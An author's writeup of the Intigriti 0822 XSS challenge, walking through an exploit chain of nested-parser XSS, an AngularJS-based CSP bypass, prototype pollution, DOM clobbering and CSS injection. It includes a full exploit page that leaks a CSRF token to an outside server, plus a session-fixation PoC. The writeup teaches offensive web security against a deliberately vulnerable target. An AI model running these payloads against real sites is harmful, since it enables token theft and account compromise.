---
title: "Intigriti 0822 XSS Challenge Author Writeup"
date: 2022-08-29 07:43:37
tags: [Security]
categories: [Security]
---
<img src="/img/intigriti-0822-xss-author-writeup/cover-en.png" style="display:none">

In Auguest, I and bruno made a XSS challenge on Intigriti. When we decided to make it, we hope it's a difficult and fun challenge, and the players can also learn a lot from it.

Here is the writeup for this challenge.

<!-- more -->

## About the challenge

https://challenge-0822.intigriti.io/

![](/img/intigriti-0822-xss-author-writeup/p1.png)

The challenge is a business card generator with following features:

1. Update theme
2. Preview name & description
3. Update name

The goal of the challenge is to pop up an alert. User interaction is allowed in a very limited sense. For example, you give the admin a page, the admin will click the "CLICK ME" button on that page, that's all.



## Solution

Basically, there are two parts of the challenge:

1. CSRF
2. bypass CSP to perform XSS

The second part is easier to understand, so I will start from the second part.

### XSS

In `preview.php`, there is a feature to replace the link to either iframe or image after sanitized:

``` php
$name = htmlspecialchars($name);
$desc = htmlspecialchars($desc);

$desc = preg_replace('/(https?:\/\/www\.youtube\.com\/embed\/[^\s]*)/', '<iframe src="$1"></iframe>', $desc);

$desc = preg_replace('/(https?:\/\/[^\s]*\.(png|jpg|gif))/', '<img src="$1">', $desc);
```

It looks fine at first glance, because we already sanitized the content, so you can't escape from the double quote.

But, if you think outside the box, you will found that it's not true.

What if a link gets transform to both iframe and img at the same time?

Take `https://www.youtube.com/embed/abc.jpg` as an example, after first replacement, it become:

```html
<iframe src="https://www.youtube.com/embed/abc.jpg"></iframe>
```

After the second replacement, the `src` part become

```html
<img src="https://www.youtube.com/embed/abc.jpg">
```

So the entire string is:

```html
<iframe src="<img src="https://www.youtube.com/embed/abc.jpg">"></iframe>
```

Because of this behavior, the double quote of the `src` attribute has been closed, which means we can inject a new attribute to iframe.

For example, we can inject `srcdoc` using this link: `https://www.youtube.com/embed/srcdoc=<h1>hello</h1>.jpg` 

![](/img/intigriti-0822-xss-author-writeup/p2.png)

You may wondering why this works, how can it bypass the `htmlspecialchars`?

No, it's not. The content is still encoded, but the context is different.

It's the content of the attribute now. In HTML, the attribute content will be decoded.

For now, we can inject any HTML we want via `<iframe srcdoc>`, but it's not an XSS at the moment as we still need to bypass the CSP.

### CSP Bypass

Here is the CSP:

```php
<?php
  header("Content-Security-Policy: ".
      "default-src 'self'; " .
      "img-src http: https:; " .
      "style-src 'unsafe-inline' http: https:; " .
      "object-src 'none';" .
      "base-uri 'none';" .
      "font-src http: https:;".
      "frame-src https://www.youtube.com/;".
      "script-src 'self' https://cdnjs.cloudflare.com/ajax/libs/;");
?>
```

It's a classic CSP bypass which even appeared in the intigriti XSS challenge last month.

`https://cdnjs.cloudflare.com/ajax/libs` is allowed, so we can use the Angular gadget in the [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-reflected-1-all-versions-(chrome)-shorter):

``` html
<input id=x ng-focus=$event.path|orderBy:'(z=alert)(1)'>
```

Are we done? Nope, it's not work because `focus` event is not triggered.

The preivew content is hidden by default, the user needs to click the button to remove `display:none` CSS rule to make it visible. It's a dead end since user interaction is not allowed here.

When it comes to Angular CSP bypass, my favorite one is the following:

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
  {{$on.curry.call().alert(1)}}
</div>
```

User interaction is not needed, as well as `unsafe-inline` and `unsafe-eval`.

I learned this payload from:

1. [Bypassing path restriction on whitelisted CDNs to circumvent CSP protections - SECT CTF Web 400 writeup](https://blog.0daylabs.com/2016/09/09/bypassing-csp/)
2. [H5SC Minichallenge 3: “Sh*t, it’s CSP!”](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it's-CSP!%22)

It seems great, but the payload still won't work because of a keyword-based block list:

```php
$dangerous_words = ['eval', 'setTimeout', 'setInterval', 'Function', 'constructor', 'proto', 'on', '%', '&', '#', '?', '\\'];

foreach ($dangerous_words as $word) {
  if (stripos($desc, $word) !== false){
    header("Location: app.php#msg=dangerous word detected!");
    die();
  }
}
```

`proto` is forbidden, also `#` and `&`, so we can't use HTML entities to bypass the detection.

To solve this problem, the player is expected to find out that why `prototype.js` is needed for the bypass.

It’s needed because prototype.js [adds a few methods](https://github.com/prototypejs/prototype/blob/master/src/prototype/lang/function.js#L226) to different prototype, like Function.prototype:

```js
function curry() {
  if (!arguments.length) return this;
  var __method = this, args = slice.call(arguments, 0);
  return function() {
    var a = merge(args, arguments);
    return __method.apply(this, a);
  }
}
```

The first argument of `Function.prototype.call` is `thisArg`, you can decide the value of `this` in the function. It's worth noting that if you call this function without providing `thisArg`, the default value of `this` will be `window` in non-strict mode.

Here is an example:

``` js
function test(){
  console.log(this)
}

test.call(123) // 123
test.call('str') // 'str'
test.call() // window
```

So, `any_function.curry.call()` will return `this` because of this line: `if (!arguments.length) return this`. And we call this function without providing `thisArg`, so `this` is `window` now. This behavior bypasses the Angular sandbox, that’s why we need `prototype.js`.

If we can find a similar library that also pollutes the prototype and return `this`, we can replace `prototype.js`.

How to find such library?

Have you heard about `SmooshGate`? 

If you don't, you can read this great article: [SmooshGate FAQ](https://developer.chrome.com/blog/smooshgate/).

It's a story about `Array.prototype.flat`, which should be named as `Array.prototype.flatten` at first.

Why `Array.prototype.flatten` is abandoned? It's because a library called [MooTools](https://mootools.net/) already used this name for quite a while. If the browsers implement `Array.prototype.flatten`, all websited that used MooTools will break.

From the story, we know that MooTools is another library which will pollute the prototype in some way.

How to find what is polluted? Looking at the source code? No, there is better way to do that.

The idea is simple, we can enumerate all methods on the prototype first, then load the library, enumerate again to see if there are anything added.

It's not hard to implement such idea:

```html
<!DOCTYPE html>

<html lang="en">
<head>
  <meta charset="utf-8">
  <script>
    function getPrototypeFunctions(prototype) {
      return Object.getOwnPropertyNames(prototype)
    }
    var protos = {
      array: getPrototypeFunctions(Array.prototype),
      string: getPrototypeFunctions(String.prototype),
      number: getPrototypeFunctions(Number.prototype),
      object: getPrototypeFunctions(Object.prototype),
      function: getPrototypeFunctions(Function.prototype)
    }
  </script>
</head>
<body>
  <!-- insert script here -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
  <!-- insert script here -->
  <script>

    var newProtos = {
      array: getPrototypeFunctions(Array.prototype),
      string: getPrototypeFunctions(String.prototype),
      number: getPrototypeFunctions(Number.prototype),
      object: getPrototypeFunctions(Object.prototype),
      function: getPrototypeFunctions(Function.prototype)
    }

    let result = {
      prototypeFunctions: [],
      functionsReturnWindow: []
    }

    function check() {
      checkPrototype('array', 'Array.prototype', Array.prototype)
      checkPrototype('string', 'String.prototype', String.prototype)
      checkPrototype('number', 'Number.prototype', Number.prototype)
      checkPrototype('object', 'Object.prototype', Object.prototype)
      checkPrototype('function', 'Function.prototype', Function.prototype)

      return result
    }

    function checkPrototype(name, prototypeName, prototype) {
      const oldFuncs = protos[name]
      const newFuncs = newProtos[name]
      for(let fnName of newFuncs) {
        if (!oldFuncs.includes(fnName)) {
          const fullName = prototypeName + '.' + fnName
          result.prototypeFunctions.push(fullName)
          try {
            if (prototype[fnName].call() === window) {
              result.functionsReturnWindow.push(fullName)
            }
          } catch(err) {

          }
        }
      }
    }

    console.log(check())
  </script>
</body>

</html>
```

The result is:

![](/img/intigriti-0822-xss-author-writeup/p3.png)

So, we can replace `prototype.js` with `MooTools`: 

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
  {{[].empty.call().alert([].empty.call().document.domain)}}
</div>
```

What if the players never heard about `SmoothGate`? They can use the similar approach in an automatic way.

`cdn.js` provides an [API](https://cdnjs.com/api#browse) to query all hosted libraries, the player can leverage this API and the script above to build a simple tool to find all gadgets on `cdn.js`. 

I will open source a project about this within a few days.

Now we have an XSS, but it still need user interaction to submit the form.

In order to avoid user interaction, we need CSRF. To perform CSRF, we need to steal CSRF token.

### Steal CSRF token

Where is the CSRF token?

The CSRF token is in the `app.php` page, it appears twice:

``` html
<meta name="csrf-token" content="<?= $csrf_token ?>"> 

<div>
  <input type="hidden" name="csrf-token" value="<?= $csrf_token ?>" />
</div>
```

There is another vulnerability in `app.php`:

```php
<input id="nameField" type="text" name="name" value="<?= $_SESSION['name']; ?>" maxlength="20">
```

`$_SESSION['name']` is not encoded before printing, so we have a HTML injection here. But the problem is, there is another check for the length of the name:

```php
if (strlen($name) >= 20) {
  die('name too long');
}
```

Given that the CSP is strict and the length is very limited, XSS is most likely impossible. It's fine, because XSS is not the only way to steal something,  we can use CSS injection!

This is a good article to learn what CSS injection is and various way to exploit: [CSS Injection Primitives](https://x-c3ll.github.io/posts/CSS-Injection-Primitives/).

Usually, the blog post about stealing CSRF token is for `<input>`, but we have `<input type=hidden>` here, so it won't work. if there is other sibling element, we can use sibling selector like this: `input[value^=a] div` to steal the token, but it's also not working here because `<input>` is wrapped by a `<div>`.

Then, how to leak the content? Since `<input>` won't work, we can use `<meta>` tag!

`<meta>` is not displayed because browser adds a default `display:none` attribute, we can override it by explicitly declare `meta { display:block; }`. It's not enough, because `<meta>` is under `<head>`, and `<head>` is also hidden by default, so we need `head, meta { display:block; }` to make it visible.

You may wondering: "It should be useless to make it 'visible', because meta content is invisible by default, you can't see the content on the screen!"

It sounds fair, but surprisingly, the style for `<meta>` still apply even you can't see the content. 

![](/img/intigriti-0822-xss-author-writeup/p4.png)

By the way, there is a selector called [:has](https://developer.mozilla.org/en-US/docs/Web/CSS/:has), this will make this challenge much easier. But it's enabled by default from Chrome 105 which is still in beta until the end of August(yep, two days after). 

If we can inject `<style>` tag, we can steal the first character of the CSRF token in the following way:

```html
<style>
  head, meta[name=csrf-token] {
    display: block;
  }
  
  meta[name=csrf-token][content^="a"] { 
    background: url(https://example.com?char=a);
  }
  
  meta[name=csrf-token][content^="b"] { 
    background: url(https://example.com?char=b);
  }
</style>
```

We can steal all 32 characters by doing the same thing again and again. The implementation is a bit trivial, you can build your own or try to utilize some open-source projects on GitHub.

When displaying a message, it calls `DOMPurify.sanitize` to filter out malicious content, but `<style>` is not consider harmful and it's allowed by default in DOMPurify.

```js
function showMessage(message, options) {
  const getTimeout = options.timeout || (() => 1000)
  const container = options.container || document.querySelector('body')

  const modal = document.createElement('div')
  modal.id = 'messageModal'
  modal.innerHTML = DOMPurify.sanitize(message)
  container.appendChild(modal)
  history.replaceState(null, null, ' ')

  setTimeout(() => {
    container.removeChild(modal)
  }, getTimeout())
}
```

The problem is, our injected element will be removed after so called `timeout`, the default timeout is `Math.random()*300 + 300` as per following code:

```js
function start() {
  const message = decodeURIComponent(location.hash.replace('#msg=', ''))
  if (!message.length) return
  const options = {}
  if (document.domain.match(/testing/)) {
    options['production'] = false
  } else {
    options['production'] = true
    options['timeout'] = () => Math.random()*300 + 300
  }
  showMessage(message, {
    container: document.querySelector('body'),
    ...options
  })
}
```

We can't steal a 32-characters CSRF token in 600ms, unless we find a way to increase the timeout.

Look at the following part carefully:

```js
if (document.domain.match(/testing/)) {
  options['production'] = false
} else {
  options['production'] = true
  options['timeout'] = () => Math.random()*300 + 300
}
```

If the condition(`document.domain.match(/testing/)`) is `false`, the `timeout` will be set and can't be change. If we can let the condition be `true` and find a prototype pollution, we can pollute `Object.prototype.timeout` to manipulate the timeout.

### Prototype pollution

Regarding prototype pollution, people usually think it only appear when parsing query string or merge the object. In fact, the problem is about the pattern `obj[x][y]`, anywhere with such pattern can be vulnerable if you can control both `x` and `y`

It's exactly the case for `initTheme`:

```js
function initTheme() {
  if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
    isDarkMode = true
  }

  fetch("theme.php")
    .then((res) => res.json())
    .then((serverTheme) => {
      theme = {
        primary: {},
        secondary: {}
      }

      // look carefully at the following for loop
      for(let themeName in serverTheme) {
        const currentTheme = theme[themeName]
        const currentServerTheme = serverTheme[themeName]

        for(let item in currentServerTheme) {
          currentTheme[item] = () => isDarkMode ? currentServerTheme[item].dark : currentServerTheme[item].light
        }
      }

      const themeDiv = document.querySelector('.theme-text')
      themeDiv.innerText = `Primary - Text: ${theme?.primary?.text()}, Background: ${theme?.primary?.bg()}
        Secondary - Text: ${theme?.secondary?.text()}, Background: ${theme?.secondary?.bg()}
      `
      start()
    })
}
```

In the loop, it assign `theme[themeName]` to `currentTheme`.

Then in another inner loop, a function is assigned to `currentTheme[item]`, which is actually `theme[themeName][item]`.

We can pollute the prototype by providing a theme like this:

```js
{
  "__proto__":{
    "timeout":{
      "dark":"99999","light":"99999"
    }
  }
}
```

After theme is loaded, `Object.prototype.timeout` became a function which always returns `"99999"`.

We have made good progress by controlling the `timeout`, but how about the condition?

How can we make `document.domain.match(/testing/)` true? Is that even possible?

### DOM clobbering to the rescue

The value of `document.domain` is what you thought, until DOM clobbering comes into play.

Besides clobbering `window` properties, `document` properties can also be clobbered via `<img>`, `<form>`, `<object>` and `<embed>`

For example, if we have `<img name=cookie>`, the value of `document.cookie` will be the img element instead of a string.

Remember that we have a HTML injection in 20 characters?

```php
<input id="nameField" type="text" name="name" value="<?= $_SESSION['name']; ?>" maxlength="20">
```

We can let `name` be `"><img name=cookie>`, it's 19 characters, just fits.

After `document.domain` became a DOM element, `document.domain.match` will throw an error because there is no `match` method in DOM or in it's prototype chain.

Wait, did I say prototype chain?

In JavaScript, when a given method is not found, the JS engine will keep looking one level up to check it's prototype until the prototype is `null`, hence the name "prototype chain".

DOM element is also a kind of `object`, if `Object.prototype.match` is there, it will be used.

Luckily, we can make it happen by leveraging the prototype pollution vulnerability:

```js
{
  "__proto__":{
    "timeout":{
      "dark":"99999","light":"99999"
    },
    "match":{
      "dark":"1", "light":"1"
    }
  }
}
```

Now, `document.domain.match(/testing/)` returns `"1"` which is truthy and `timeout` is `9999`, we can finally exploit CSS injection and steal the CSRF token.

Part1 is about steal CSRF token to perform CSRF, part2 is about exploit nested parser vulnerability and find a CSP bypass to perform XSS.

After finished both parts, we can build our full exploit script.

## Full Exploit

1. Login with the name `"><img name=domain>` to do DOM clobbering
2. Update theme to do prototype pollution
3. Get CSRF token via CSS injection
4. CSRF to submit the payload which leverage nested parser XSS + CSP bypass via AngularJS
5. Pop up the alert

``` html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="robots" content="noindex">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
</head>

<body>
  <button onclick="run()">click me to start</button>
  <form id=themeForm method="POST" target="newWindow" enctype="text/plain">
    <input name='{"__proto__":{"timeout":{"dark":"99999","light":"99999"},"match":{"drak":"1","light":"1"}},"primary":{"text":{"dark":"#fff","light":"#fff"},"bg":{"dark":"#fff","light":"#fff"}},"secondary":{"text":{"dark":"#fff","light":"#fff"},"bg":{"dark":"#fff","light":"#fff","padding":"' value='"}}}'>
  </form>
  <form id=previewForm method="POST" target="newWindow">
    <input name="csrf-token" value="">
    <input name="desc" value="">
    <input name="name" value="XSS">
  </form>
  <script>
    const baseUrl = 'https://challenge-0822.intigriti.io/challenge'
    // you need to prepare a server to steal csrf token
    const cssInjectionServerUrl = 'http://localhost:5100'
    let win
    function run() {
      // Step1. login
      // Step2. DOM clobbering `document.domain`
      let payload = '"><img name=domain>'
      win = window.open(baseUrl + '/login.php?name=' + encodeURIComponent(payload), 'newWindow')

      waitForWindowLoaded()
    }

    function waitForWindowLoaded() {
      try {
        // if we can access win.origin, it means that the location haven't changed
        win.origin
        setTimeout(() => waitForWindowLoaded(win), 200)
      } catch(err) {
        // window loaded
        // Step3. update theme to do prototype pollution
        themeForm.action = baseUrl + '/theme.php'
        themeForm.submit()
        setTimeout(getCsrfToken, 1000)
      }
    }

    function getCsrfToken() {
      // Step4: Get CSRF token via CSS injection
      const id = Math.random()
      fetch(cssInjectionServerUrl + '/result?id='+id)
        .then(res => res.text())
        .then(res => {
          doXSS(res)
        })

      const cssInjectionPayload = `Please wait for a few seconds
        <style>
          @import url('${cssInjectionServerUrl}/start?id=${id}&len=32')
        </style>`
      win.location = baseUrl + '/app.php#msg=' + encodeURIComponent(cssInjectionPayload)
    }

    function doXSS(csrfToken) {
      // Step5: Nested Parser XSS + CSP bypass via AngularJS
      let xssPayload = `https://www.youtube.com/embed/srcdoc=<script/src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"><\/script><script/src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"><\/script><div/ng-app/ng-csp>{{[].empty.call().alert([].empty.call().document.domain)}}</div>.png
`
      document.querySelector('#previewForm input[name=desc]').setAttribute('value', xssPayload)
      document.querySelector('#previewForm input[name=csrf-token]').setAttribute('value', csrfToken)
      previewForm.action = baseUrl + '/preview.php'
      previewForm.submit()
    }
  </script>

</body>
</html>
```

Here is a working PoC: https://randomstuffhuli.s3.amazonaws.com/0822-intigriti/exploit-intigriti.html

But the css injection server is a bit buggy, and I have no plan to maintain it, so I will shutdown the server in a week.

## Bonus

Besides stealing CSRF token, there is another tricky and a bit cheated way to do CSRF without stealing it.

Since we have control over other sub domains, for example, `challenge-0422.intigriti.io`, we can use session fixation to fix session id and CSRF token.

1. Get a session id and CSRF token from server, assumed it's `sid123` and `token123`
2. Run `document.cookie="PHPSESSID=sid123;Domain=intigriti.io;Max-Age=10;Secure";` in subdomain
3. Do CSRF with CSRF token: `token123`

PoC:

``` html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="robots" content="noindex">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
</head>

<body>
  <button onclick="run()">click me to start</button>
  <form id=previewForm method="POST" target="abc">
    <input name="csrf-token" value="">
    <input name="desc" value="">
    <input name="name" value="XSS">
  </form>
  <script>
    const baseUrl = 'https://challenge-0822.intigriti.io/challenge'
    
    // get a pair of seesion id and csrf token first
    const sid = '8341g3mkhlpojfup4k6keu3uls'
    const token = '2d414a262b5b02643a364a23a5f67dd7'

    function run() {
         window.open(`https://challenge-0222.intigriti.io/challenge/xss.html?q=%3Cstyle/onload=eval(uri)%3E&first=1#%0adocument.cookie='PHPSESSID=${sid};Domain=intigriti.io;Max-Age=10;Secure;'`, 'abc')

        setTimeout(() => {
          doXSS(token)
        }, 2000)
    }
   

    function doXSS(csrfToken) {
      let xssPayload = `https://www.youtube.com/embed/srcdoc=<script/src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"><\/script><script/src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"><\/script><div/ng-app/ng-csp>{{[].empty.call().alert([].empty.call().document.domain)}}</div>.png
`
      document.querySelector('#previewForm input[name=desc]').setAttribute('value', xssPayload)
      document.querySelector('#previewForm input[name=csrf-token]').setAttribute('value', csrfToken)
      previewForm.action = baseUrl + '/preview.php'
      previewForm.submit()
    }
  </script>

</body>
</html>
```

I came up with this solution after the challenge started, and it shows how a sub-domain XSS can be abused to affect other sub-domain.

## Credits

Bruno and I designed, created and implemented the challenge together. However, we still standing on the shoulders of giants. We learned a lot from other brilliant people and try to integrated some of their idea to our challenge.

Kudos to [@Psych0tr1a](https://twitter.com/Psych0tr1a) for his nested parser XSS research: [Fuzzing for XSS via nested parsers condition](https://swarm.ptsecurity.com/fuzzing-for-xss-via-nested-parsers-condition/)

Kudos to [@Strellic_](https://twitter.com/Strellic_) for his idea of chaining DOM clobbering and prototype pollution and share the writeup: [UNI CTF 2021: A Complex Web Exploit Chain & a 0day to Bypass an Impossible CSP](https://www.hackthebox.com/blog/UNI-CTF-21-complex-web-exploit-chain-0day-bypass-impossible-CSP)

Kudos to [@tehjh](https://twitter.com/tehjh) for his amazing [CSP bypass via Angular](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it's-CSP!%22#191-bytes)

We hope you like the challenge and learn a lot of new things, see you next time!
